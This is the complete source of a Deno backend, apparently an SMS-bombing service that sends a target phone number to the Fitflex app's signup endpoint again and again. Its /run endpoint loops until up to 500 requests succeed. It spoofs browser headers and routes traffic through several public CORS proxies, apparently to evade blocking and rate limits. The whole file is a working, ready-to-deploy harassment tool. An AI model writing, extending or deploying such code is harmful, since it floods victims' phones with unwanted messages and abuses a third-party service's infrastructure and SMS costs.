// main.ts — Deno Deploy backend
// Sirf Fitflex. Retry loop until target success reached.

const FITFLEX_URL = 'https://prod.fitflexapp.com/api/users/signupV1';
const UA = 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/150.0.0.0 Mobile Safari/537.36';

const CORS = {
  'Access-Control-Allow-Origin': '*',
  'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
  'Access-Control-Allow-Headers': 'Content-Type, X-Auth-Token',
};

const MULTIPLIER = 10;            // user × 10 = target
const TARGET_MAX = 500;
const PARALLEL = 5;               // ek waqt me kitni bhejo
const MAX_ATTEMPTS = 40;          // safety: kitni baar retry tak
const REQUEST_TIMEOUT = 8000;

const PROXIES: ((u: string) => string)[] = [
  (u) => u,
  (u) => 'https://api.allorigins.win/raw?url=' + encodeURIComponent(u),
  (u) => 'https://corsproxy.io/?' + encodeURIComponent(u),
  (u) => 'https://api.codetabs.com/v1/proxy?quest=' + encodeURIComponent(u),
  (u) => 'https://thingproxy.freeboard.io/fetch/' + u,
];

function toIntl(num: string): string {
  let s = String(num).replace(/\D/g, '');
  if (s.startsWith('0')) s = s.slice(1);
  if (!s.startsWith('92')) s = '92' + s;
  return s;
}

function log(tag: string, msg: string) {
  console.log(`[${new Date().toISOString()}] [${tag}] ${msg}`);
}

type FireResult = {
  status: number;
  body: string;
  sent: boolean;
  via?: string;
  error?: string;
};

async function tryOne(
  url: string,
  payload: string,
  headers: Record<string, string>,
  timeoutMs: number
): Promise<{ status: number; body: string }> {
  const controller = new AbortController();
  const timer = setTimeout(() => controller.abort(), timeoutMs);
  try {
    const res = await fetch(url, {
      method: 'POST',
      signal: controller.signal,
      headers,
      body: payload,
    });
    clearTimeout(timer);
    const txt = await res.text();
    return { status: res.status, body: txt };
  } catch (e) {
    clearTimeout(timer);
    throw e;
  }
}

// Ek single fitflex request — 5-layer race
async function fireOne(msisdn: string, idx: number): Promise<FireResult> {
  const payload = JSON.stringify({
    msisdn: msisdn,
    type: 'msisdn',
    device_name: 'Netscape',
    app_version: '1.0',
    user_platform: UA,
  });

  const directHeaders: Record<string, string> = {
    'Content-Type': 'application/json',
    'Accept': '*/*',
    'Accept-Language': 'en-PK,en-GB;q=0.9,en-US;q=0.8,en;q=0.7',
    'Origin': 'https://fitflexapp.com',
    'Referer': 'https://fitflexapp.com/',
    'User-Agent': UA,
    'sec-ch-ua': '"Not;A=Brand";v="8", "Chromium";v="150", "Google Chrome";v="150"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'Sec-Fetch-Site': 'same-site',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Dest': 'empty',
  };

  const proxyHeaders: Record<string, string> = {
    'Content-Type': 'application/json',
    'User-Agent': UA,
  };

  const race = PROXIES.map((buildUrl, i) => {
    const isDirect = i === 0;
    const url = buildUrl(FITFLEX_URL);
    const headers = isDirect ? directHeaders : proxyHeaders;
    const layerName = isDirect ? 'DIRECT' : `P${i}`;
    return tryOne(url, payload, headers, REQUEST_TIMEOUT)
      .then(r => ({ ...r, layerName }))
      .catch(() => ({ status: 0, body: '', layerName }));
  });

  try {
    const results = await Promise.all(race);
    const good = results.find(r => r.status >= 200 && r.status < 300);
    if (good) {
      return { status: good.status, body: good.body, sent: true, via: good.layerName };
    }
    const best = results.reduce((a, b) => (b.status > a.status ? b : a));
    return { status: best.status, body: best.body, sent: false, via: best.layerName };
  } catch (e) {
    const msg = e instanceof Error ? e.message : String(e);
    return { status: 0, body: '', sent: false, error: msg };
  }
}

// Retry loop — jab tak target success na mile
async function runUntilSuccess(
  msisdn: string,
  target: number,
  onProgress?: (sent: number, target: number, attempts: number) => void
): Promise<{ sent: number; totalAttempts: number; failed: number; via: Record<string, number> }> {
  let sent = 0;
  let attempts = 0;
  const viaCount: Record<string, number> = {};

  while (sent < target && attempts < MAX_ATTEMPTS) {
    const remaining = target - sent;
    const batchSize = Math.min(PARALLEL, remaining);

    // Launch PARALLEL requests at once
    const batchTasks: Promise<FireResult>[] = [];
    for (let i = 0; i < batchSize; i++) {
      batchTasks.push(fireOne(msisdn, attempts + i + 1));
    }

    const results = await Promise.all(batchTasks);
    attempts += batchSize;

    for (const r of results) {
      if (r.sent) {
        sent++;
        viaCount[r.via || 'UNKNOWN'] = (viaCount[r.via || 'UNKNOWN'] || 0) + 1;
      }
    }

    log('RETRY', `attempts=${attempts} sent=${sent}/${target}`);

    if (onProgress) onProgress(sent, target, attempts);
  }

  return {
    sent,
    totalAttempts: attempts,
    failed: attempts - sent,
    via: viaCount,
  };
}

Deno.serve(async (req: Request) => {
  const url = new URL(req.url);

  if (req.method === 'OPTIONS') {
    return new Response(null, { status: 204, headers: CORS });
  }

  // -------- /debug --------
  if (url.pathname === '/debug') {
    const num = (url.searchParams.get('num') || '').trim();
    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no num' }), {
        status: 400, headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }
    const f = await fireOne(toIntl(num), 0);
    return new Response(JSON.stringify({
      fitflex: {
        status: f.status, sent: f.sent, via: f.via || null,
        body: f.body.slice(0, 1000), error: f.error || null,
      },
    }), { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } });
  }

  // -------- /run --------
  if (url.pathname === '/run') {
    const num = (url.searchParams.get('num') || '').trim();
    const countStr = url.searchParams.get('count') || '10';
    let userCount = parseInt(countStr, 10);
    if (!Number.isFinite(userCount) || userCount < 1) userCount = 10;
    if (userCount > 50) userCount = 50;

    if (!num) {
      return new Response(JSON.stringify({ ok: false, error: 'no number' }), {
        status: 400, headers: { 'Content-Type': 'application/json', ...CORS },
      });
    }

    const target = Math.min(userCount * MULTIPLIER, TARGET_MAX);
    const msisdn = toIntl(num);
    const t0 = Date.now();

    log('API', `START num=${num} intl=${msisdn} user=${userCount} target=${target} parallel=${PARALLEL}`);

    const result = await runUntilSuccess(msisdn, target);

    const elapsed = ((Date.now() - t0) / 1000).toFixed(2);
    log('DONE', `sent=${result.sent}/${target} attempts=${result.totalAttempts} time=${elapsed}s`);

    return new Response(JSON.stringify({
      ok: true,
      msisdn,
      userCount,
      multiplier: MULTIPLIER,
      target,
      elapsed: parseFloat(elapsed),
      fitflex: {
        sent: result.sent,
        failed: result.failed,
        totalAttempts: result.totalAttempts,
        via: result.via,
        complete: result.sent >= target,
      },
    }), { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } });
  }

  return new Response(JSON.stringify({
    ok: true,
    service: 'NAIRON FITFLEX RETRY ENGINE',
    endpoints: ['/run?num=03XXXXXXXXX&count=10', '/debug?num=03XXXXXXXXX'],
  }), { status: 200, headers: { 'Content-Type': 'application/json', ...CORS } });
});
